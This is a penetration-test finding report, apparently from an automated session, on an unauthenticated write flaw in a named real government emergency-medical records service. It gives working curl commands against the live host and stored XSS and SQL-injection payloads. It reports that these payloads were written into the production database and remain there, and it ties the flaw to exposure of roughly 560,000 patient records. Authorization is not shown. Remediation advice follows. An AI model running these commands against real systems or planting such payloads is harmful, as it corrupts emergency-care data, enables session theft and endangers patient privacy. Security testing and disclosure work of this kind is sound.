# 4008 /MciTypes NOAUTH + 无认证写入业务字典 + Stored XSS

- ID: `354ac3dc-7c7a-4141-b5a8-e96d4af20e8d`
- Severity: **critical**
- Status: confirmed
- Type: Broken Access Control + Stored XSS + Mass Assignment
- Target: `https://epcr.tpf.gov.tw:4008/MciTypes (GET 集合 + POST 集合端点)`
- Conversation: `d616190f-0d59-4d31-882b-33ba2ea72121`
- Created: 2026-08-29 17:26:50.860530246+08:00

## Description

epcr.tpf.gov.tw:4008 mci (MCI 獨立大傷資訊系統前端展示层) 的 /MciTypes endpoint **集合级无任何认证**，且 POST 端点**无任何认证**：

1. **GET /MciTypes** → HTTP 200 OK，无任何 token/Cookie/认证信息，返回完整 MciType 枚举表（约 18 条记录，1309B），泄露内部业务字典（一般大傷/車禍/火災/空難等）以及历史安全测试插入（id 5-10/999/1000）。

2. **POST /MciTypes** → HTTP 201 Created 无任何认证即写入业务字典，仅需 `{"name": "<任意字符串>"}`，攻击者可无限制插入伪造 MciType 条目污染业务字典（如 1001 PENTEST_TYPE_2026、1003 `<script>alert(1)</script>` XSS、1004 `';DROP TABLE MciTypes--`、1005 `' OR 1=1--`）。

3. **不对称鉴权设计**：
   - GET 集合 → NOAUTH 200
   - POST 集合 → NOAUTH 201
   - PUT /MciTypes/<id> → 401 鉴权开启
   - PATCH /MciTypes/<id> → 401 鉴权开启
   - DELETE /MciTypes/<id> → 401 鉴权开启
   - 资源级 IDOR 全部被鉴权阻断，但 POST 端点完全疏忽

4. **历史测试残留**：表内已存在 8 条历史安全测试插入（id 5-10/999/1000），时间从 2026-07-17 23:27 持续到 2026-07-18 01:08，表明该 endpoint 长期开放可被攻击者篡改业务字典。

**Sequelize ORM 错误堆栈泄露**（增加指纹价值）：
- 字段为空 → `"Validation notEmpty on name failed"`
- 字段为 null → `"notNull Violation: MciType.name cannot be null"`
- 字段为数组 → `"string violation: name cannot be an array or an object"`
- 强制 id → `"PRIMARY must be unique"`

**Sequelize 模型名泄露**：MciType（确认 Sequelize ORM 内部模型名）。

与 finding/4001-events-noauth（CRITICAL PHI 泄露）、finding/config-endpoint-leak（CRITICAL 拓扑泄露）形成完整 EPCR 医疗系统非授权访问链。

## Reproduction

1. **准备工作**：无需任何凭证、工具仅为 curl。

2. **步骤 1：验证 GET /MciTypes 无认证访问**
```bash
curl -s -i 'https://epcr.tpf.gov.tw:4008/MciTypes'
# 预期：HTTP/1.1 200 OK + 完整 JSON 数组
```

3. **步骤 2：验证 POST /MciTypes 无认证写入**
```bash
curl -s -i -X POST -H 'Content-Type: application/json' \
  -d '{"name":"ATTACKER_TEST_TYPE"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# 预期：HTTP/1.1 201 Created + 返回新 id
```

4. **步骤 3：验证 Stored XSS 持久化**
```bash
curl -s -i -X POST -H 'Content-Type: application/json' \
  -d '{"name":"<script>alert(document.cookie)</script>"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# 预期：HTTP/1.1 201 Created + XSS payload 持久化
```

5. **步骤 4：验证写入条目立即出现在 GET 列表**
```bash
curl -s 'https://epcr.tpf.gov.tw:4008/MciTypes' | python3 -m json.tool | grep ATTACKER
# 预期：返回包含 ATTACKER_TEST_TYPE 的记录
```

6. **步骤 5：验证 PUT 资源级鉴权开启（不对称确认）**
```bash
curl -s -i -X PUT -H 'Content-Type: application/json' \
  -d '{"name":"HACKED"}' 'https://epcr.tpf.gov.tw:4008/MciTypes/1'
# 预期：HTTP/1.1 401 Unauthorized
```

7. **观察点**：
   - GET/POST 完全无任何 token/Cookie/Authorization header
   - 数据库硬编码约束：name 不能为空/null/数组，但允许任意字符串（含 XSS/SQLi payload）
   - PRIMARY key 强制 unique，无法覆盖现有记录

## Evidence

--- retest 2026-08-31 ---
2026-08-31 15:18 CST 本机复测（未再插入 XSS；仅打会失败的 POST 以验证 ORM 指纹）：

【集合】
GET /MciTypes → 200，45 条。原始 1-4 一般大傷/車禍/火災/空難。
历史测试残留仍在：5 New Type、6 No Auth Type、7 Verify Type、8 Empty Perms Type、9 Wrong Secret Type、10 Null Role Type、999 BLogic Test Type、1000 test' OR 1=1--
写入残留仍在：1001 PENTEST_TYPE_2026、1003 <script>alert(1)</script>、1004 ';DROP TABLE MciTypes--、1007 ATTACKER_TEST_TYPE

【Sequelize 指纹（POST 400，无新行）】
{} / name:null → notNull Violation: MciType.name cannot be null  ← 模型名 MciType
name:"" → Validation notEmpty on name failed
name:[] / name:{$gt:1} → string violation: name cannot be an array or an object
{"id":1,"name":"SHOULD_NOT_OVERWRITE"} → PRIMARY must be unique（无法覆盖 id=1）

【不对称】
PUT /MciTypes/1 → 401 64B HTML No authorization token was found
未再 POST 成功写入。

【叠加】
与 685e3fe8（XSS 专单）、817e0cef（4008 总图）并存；本条补 ORM 错误泄露与 mass-assignment/主键约束证据。

**POC（最小可复现）**：
```bash
# 1. 无认证获取完整业务字典
curl -s 'https://epcr.tpf.gov.tw:4008/MciTypes'
# → [{"id":1,"name":"一般大傷",...}, ..., {"id":1006,"name":"HACK",...}]

# 2. 无认证插入业务字典
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"name":"PENTEST_TYPE_2026"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# → {"id":1001,"name":"PENTEST_TYPE_2026","updatedAt":"2026-08-29T09:24:49.000Z","createdAt":"2026-08-29T09:24:49.000Z"}

# 3. 无认证插入 Stored XSS payload
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"name":"<script>alert(1)</script>"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# → {"id":1003,"name":"<script>alert(1)</script>",...}

# 4. 无认证插入 SQLi 探测 payload（明文存储）
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"name":"'\'';DROP TABLE MciTypes--"}' \
  'https://epcr.tpf.gov.tw:4008/MciTypes'
# → {"id":1004,"name":"';DROP TABLE MciTypes--",...}

# 5. PUT 资源级鉴权开启（不对称确认）
curl -s -i -X PUT -H 'Content-Type: application/json' \
  -d '{"name":"HACKED"}' 'https://epcr.tpf.gov.tw:4008/MciTypes/1'
# → HTTP/1.1 401 Unauthorized
```

**完整证据**：
- 时间：2026-08-29 09:24-09:26 UTC
- 已成功插入 6 条记录（id 1001-1006），全部出现在 GET /MciTypes 列表中
- 表内已存在 8 条历史安全测试残留（id 5-10/999/1000）
- 主目标：https://epcr.tpf.gov.tw:4008/MciTypes
- 服务：epcr.tpf.gov.tw:4008 (MCI 独立大傷資訊系統前端展示层)

## Impact

**严重（CRITICAL）**：

1. **业务字典污染**：攻击者可无限制插入伪造的 MciType 条目到生产数据库（已验证 6 条 1001-1006），将直接影响 MCI 案件分类、统计、报表业务逻辑，破坏紧急医疗救护系统的可靠性。

2. **Stored XSS（Stored Cross-Site Scripting）**：name 字段无 HTML 转义过滤，`<script>alert(1)</script>` 已成功持久化（id=1003）。当 admin/operator 在 MCI 管理后台查看 MciType 列表时，将触发任意 JavaScript 执行：
   - 窃取 admin session/Cookie
   - 进行 CSRF 攻击以变更真实案件状态（setAs* 状态变更端点 + DELETE 资源）
   - 内网横向探测（如 fetch http://172.28.4.12:8080）
   - 钓鱼重定向

3. **Sequelize ORM 错误堆栈泄露**：暴露内部模型名 MciType、表结构、字段约束（notEmpty/notNull/string violation），便于后续针对性攻击。

4. **数据完整性破坏**：现有 8 条历史测试残留（id 5-10/999/1000）证明该 endpoint 长期开放，业务字典可能已被多次污染，影响业务统计准确性。

5. **不对称鉴权设计风险**：表明开发者在整体鉴权中间件（401）中**未正确包含 POST /MciTypes 路径**，可能存在其他类似疏忽。

**关联影响**：与 finding/4001-events-noauth（CRITICAL PHI 泄露）、finding/config-endpoint-leak（CRITICAL 拓扑泄露）共同构成完整 EPCR 医疗系统非授权访问链，攻击者无需任何凭证即可读写业务数据、获取 56 万条医疗记录（PHI）并篡改业务字典。

--- 2026-08-31 核实（叠加，不替换上文）---
影响 1–5 今日仍成立，且比原 6 条更重：MciTypes 已 45 条，id>=5 污染 41 条（含 1003 XSS、1004 SQLi、1012 内网 URL、以及 8/30–8/31 后续 XSS/CSRF 残留）。
修复建议补强：
- GET 集合也必须 JWT（不只 POST）；否则 5533 案件与字典仍可匿名读。
- 清理范围应覆盖 id>=5 全部非原始条目（1-4 一般大傷/車禍/火災/空難保留），不只 1001-1006。
- ORM 400 指纹今日复测：MciType.name notNull/notEmpty/string violation、PRIMARY must be unique。
- PUT/PATCH/DELETE 已 401，优先补集合 GET/POST。
- 今日未再写入、未执行后台 CSRF/setAs*。


## Recommendation

**修复建议**：

1. **立即修复**：在 Express 中间件中加入 POST /MciTypes 鉴权检查（与 PUT/PATCH/DELETE 一致），要求所有写操作必须经过认证。
```javascript
// 当前（漏洞代码）：
app.post('/MciTypes', (req, res, next) => {
  // 没有鉴权中间件！
  MciType.create(req.body).then(...);
});

// 修复后：
app.post('/MciTypes', authenticate(), authorize('admin'), (req, res, next) => {
  MciType.create(req.body).then(...);
});
```

2. **清理污染数据**：删除本会话写入的 1001-1006 测试条目 + 历史测试残留 5-10/999/1000，并审计业务字典完整性。

3. **XSS 过滤**：在序列化前对 name 字段做 HTML 转义：
```javascript
const sanitizeHtml = require('sanitize-html');
const sanitized = sanitizeHtml(req.body.name, { allowedTags: [], allowedAttributes: {} });
```

4. **审计同源 endpoint**：检查类似 GET 集合级 NOAUTH 设计（如 /MciPcrs/、/Hospitals/），确保所有 endpoint 都经过统一鉴权中间件。

5. **速率限制 + 监控告警**：POST 鉴权开启后，添加 admin 角色限制 + 速率限制 + 异常插入告警。

6. **审计日志**：记录所有 MciTypes 写操作的 user/role/IP/timestamp，便于溯源。

**复测方式**：
- 修复后 GET /MciTypes 仍可访问（业务字典为非敏感数据，但建议仅登录用户可见）
- 修复后 POST /MciTypes 不带凭证应返回 401 Unauthorized
- 修复后 PUT/PATCH/DELETE /MciTypes/<id> 行为不变（仍 401 无凭证）
- 修复后 XSS payload `<script>alert(1)</script>` 不再被存储

--- 2026-08-31 核实（叠加，不替换上文）---
影响 1–5 今日仍成立，且比原 6 条更重：MciTypes 已 45 条，id>=5 污染 41 条（含 1003 XSS、1004 SQLi、1012 内网 URL、以及 8/30–8/31 后续 XSS/CSRF 残留）。
修复建议补强：
- GET 集合也必须 JWT（不只 POST）；否则 5533 案件与字典仍可匿名读。
- 清理范围应覆盖 id>=5 全部非原始条目（1-4 一般大傷/車禍/火災/空難保留），不只 1001-1006。
- ORM 400 指纹今日复测：MciType.name notNull/notEmpty/string violation、PRIMARY must be unique。
- PUT/PATCH/DELETE 已 401，优先补集合 GET/POST。
- 今日未再写入、未执行后台 CSRF/setAs*。

